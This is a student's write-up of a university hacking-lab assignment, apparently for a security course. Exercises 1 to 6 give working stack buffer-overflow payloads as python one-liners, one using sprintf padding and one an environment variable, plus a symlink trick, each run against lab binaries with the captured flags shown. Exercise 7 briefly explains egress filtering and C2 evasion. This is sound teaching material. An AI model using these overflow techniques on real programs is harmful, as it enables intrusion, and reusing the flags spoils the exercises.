```html
<div style="page-break-after: always;"></div>
```

###### Exercise 1

> [!exercise]+ Exercise 1
> Go to /home/q1/. Exploit the program to get the secret.
> 
> **Answer:**
To exploit the program and obtain the secret, we target the buffer overflow vulnerability caused by `strcpy`. The `buffer` array has 1024 bytes, and `changeme` is immediately after it in memory. To overwrite `changeme`, our input needs to exceed the `buffer` size and alter `changeme`'s value from 0.
> 
> By supplying an input of 1025 characters, we overflow `buffer` and change at least one byte of `changeme`, triggering the conditional to reveal the secret.
>```
>student@hacklabvm:/home/q1$ ./run_me $(python -c 'print("A"*1025)')
 >_________________________________________
>/ csf2024s1_{flockwise-overdiversificatio \
>\ n-muriciform}                           /
> -----------------------------------------
>  \
>   \
>       __     
>      UooU\.'@@@@@@`.
>      \__/(@@@@@@@@@@)
>           (@@@@@@@@)
>           `YY~~~~YY'
>            ||    ||
>```

<div style="page-break-after: always;"></div>

###### Exercise 2

> [!exercise]+ Exercise 2
> Go to/ home/q2/. Exploit the program to get the secret.
> 
> **Answer:**
> This follows the same logic as exercise 1, but instead of overwriting `changeme` with anything, we need to change it to `0xabcdabcd`. Similar to before, we fill `buffer` with 1024 bytes of garbage, and now we must append `0xabcdabcd` in little endian format, i.e. `\xcd\xab\xcd\xab`.
> 
> Since we are limited to `python3`, the command is also a bit different due to the way strings are encoded.
>```
>student@hacklabvm:/home/q2$ ./run_me $(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*1024 + b"\xcd\xab\xcd\xab")')
> _________________________________________
>/ csf2024s1_{salvifics-cohesionless-nondi \
>\ lation}                                 /
> -----------------------------------------
>  \
>   \
>       __     
>      UooU\.'@@@@@@`.
>      \__/(@@@@@@@@@@)
>           (@@@@@@@@)
>           `YY~~~~YY'
>            ||    ||
>```
<div style="page-break-after: always;"></div>

###### Exercise 3

> [!exercise] Exercise 3
> Go to /home/q3/. Exploit the program to get the secret.
> 
> **Answer:**
> This one is very similar to question 2. All we need to do is overwrite the unsigned int with the address of the `secret` function. We attain this by opening the binary inside `gdp` and printing the address.
> 
> ```
> (gdb) print secret
> $1 = {void ()} 0x565561ed \<secret>
> ```
> Now that we have the address, we convert it to little endian format and place it inside our payload (using the same method as question 2)
> 
> ```
> student@hacklabvm:/home/q3$ ./run_me $(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*1024 + b"\xed\x61\x55\x56")')
> Jumping to function at 0x565561ed!!
>  _________________________________________
> / csf2024s1_{hiddenly-avitaminoses-diasta \
> \ lsis}                                   /
>  -----------------------------------------
>   \
>    \
>        __     
>       UooU\.'@@@@@@`.
>       \__/(@@@@@@@@@@)
>            (@@@@@@@@)
>            `YY~~~~YY'
>             ||    ||
> ```

<div style="page-break-after: always;"></div>

###### Exercise 4

> [!exercise]+ Exercise 4
> Go to /home/q4/. Exploit the program to get the secret.
> 
> **Answer:**
> Quite similar to the last question, except our input can only be less than 100 characters. Because `sprintf` is used instead of `strcpy`, we can get around this limitation by padding the input inside this function, rather than through python.
> 
> ```
> "%01024d"
>```
>
>Then we just need to find the address of the `secret` through GDB.
>```
>(gdb) print secret
$1 = {void ()} 0x565561fd \<secret>
>```
>Converting the address to little endian in hexadecimal and combining it all together, we get:
>
>```
>student@hacklabvm:/home/q4$ ./run_me $(python3 -c 'import sys; sys.stdout.buffer.write(b"%01024d" + b"\xfd\x61\x55\x56")')
>Jumping to function at 0x565561fd!!
> _________________________________________
>/ csf2024s1_{similarities-waftage-pockhou \
>\ se}                                     /
> -----------------------------------------
>  \
>   \
>       __     
>      UooU\.'@@@@@@`.
>      \__/(@@@@@@@@@@)
>           (@@@@@@@@)
>           `YY~~~~YY'
>            ||    ||
>```

<div style="page-break-after: always;"></div>
###### Exercise 5

> [!exercise]+ Exercise 5
> Go to /home/q5/. Exploit the program to get the secret.
> 
> **Answer:**
> This one is straightforward - since we don't have permissions to create a file inside `/q5`, we can create a `symlink` to the `secret` file from `secet` contained in `~` and run the script inside `~`.
> 
> ```
> student@hacklabvm:~$ ln -s /home/q5/secret ./secet
student@hacklabvm:~$ ls -l
lrwxrwxrwx  1 student student   15 Mar 28 03:58 secet -> /home/q5/secret
> ...
>```
>
>```
>student@hacklabvm:~$ ../q5/run_me
> _________________________________________
>/ csf2024s1_{phalangitic-utfangethef-cano \
>\ nicate}                                 /
> -----------------------------------------
>  \
>   \
>       __     
>      UooU\.'@@@@@@`.
>      \__/(@@@@@@@@@@)
>           (@@@@@@@@)
>           `YY~~~~YY'
>            ||    ||
>```
<div style="page-break-after: always;"></div>

###### Exercise 6

> [!exercise]+ Exercise 6
> Go to /home/q6/. Exploit the program to get the secret.
> 
> **Answer:**
> Another straightforward one. We need to once again cause a buffer overflow and overwrite the `flag` variable with `0xdeadbeef`. To do this, add the hex code as an environment variable to `Q6_SECRET_CODE` padded with prepended junk data. We can use `export` for this. 
> 
> ```
> export Q6_SECRET_CODE=$(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*1024 + b"\xef\xbe\xad\xde")')
>```
>
>Then we simply execute the program.
>
>```
>student@hacklabvm:/home/q6$ ./run_me
> _________________________________________
>/ csf2024s1_{linkages-lunchtime-bepillare \
>\ d}                                      /
> -----------------------------------------
>  \
>   \
>       __     
>      UooU\.'@@@@@@`.
>      \__/(@@@@@@@@@@)
>           (@@@@@@@@)
>           `YY~~~~YY'
>            ||    ||
>student@hacklabvm:/home/q6$ 
>```


<div style="page-break-after: always;"></div>

###### Exercise 7

<div style="page-break-after: always;"></div>

> [!exercise]+ Exercise
> 
> Firewalls have the capability to block both ingress (inbound) and egress (outbound) traffic. Many organisations (and also true for my home NBN router) block ingress, but is pretty open when it comes to egress rules.
> 
> 1. Why should organisations care about setting egress (outbound) firewall rules?
> 
> Organizations should implement egress firewall rules for several reasons:
> 
> a) Preventing data exfiltration: Limiting outbound traffic reduces the risk of attackers stealing sensitive information.
> 
> b) Restricting attacker movement: Strict egress filtering makes it harder for attackers to create backdoors or communicate with external command-and-control servers.
> 
> c) Detecting anomalous behavior: Monitoring allowed outbound traffic helps identify compromised systems attempting to contact malicious domains or transmit unusual amounts of data.
> 
> d) Enforcing security policies: Egress rules enable organizations to control which applications, protocols, and destinations can communicate externally, reducing the attack surface.
> 
> 2. Look up "C2 server" on the internet and explain why they can be successful even on firewalls that tightly restrict egress traffic to sanctioned ports like 53, 80 and 443.
> 
> C2 (Command-and-Control) servers are infrastructure set up by attackers to control compromised systems within a target network. When an attacker successfully breaches a system, they often install malware that establishes a connection back to the C2 server, allowing the attacker to remotely control the infected machine and exfiltrate data.
> 
> C2 servers can be successful even when firewalls restrict outbound traffic to specific ports like 53, 80, and 443 because:
> 
> a) They can disguise malicious traffic as legitimate web requests, DNS queries, or encrypted HTTPS connections on allowed ports.
> 
> b) C2 servers can adapt to use whichever ports are available, such as using DNS tunneling over port 53 if other options are restricted.



###### Exercise 8

<div style="page-break-after: always;"></div>

###### Exercise 9

<div style="page-break-after: always;"></div>

###### Exercise 10







